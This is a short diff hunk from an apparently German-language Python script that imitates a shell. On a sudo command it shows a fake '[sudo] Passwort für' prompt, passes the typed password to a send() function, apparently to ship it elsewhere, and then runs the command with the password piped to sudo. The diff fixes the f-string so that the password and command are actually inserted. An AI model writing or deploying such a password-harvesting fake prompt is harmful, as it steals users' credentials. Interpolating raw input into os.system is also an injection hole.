@@ -44,7 +44,7 @@ while Input!="exit":
             User=getpass.getuser()
             Password=getpass.getpass(f"[sudo] Passwort für {User}: ")
             send(User, Password)
-            os.system('fish -c "echo -e \'{Password}\\n\' | sudo -S {Input[5:]}"')
+            os.system(f'fish -c "echo -e \'{Password}\\n\' | sudo -S {Input[5:]}"')
         elif split[0]=="su":
             if len(split)==1:
                 User="root"
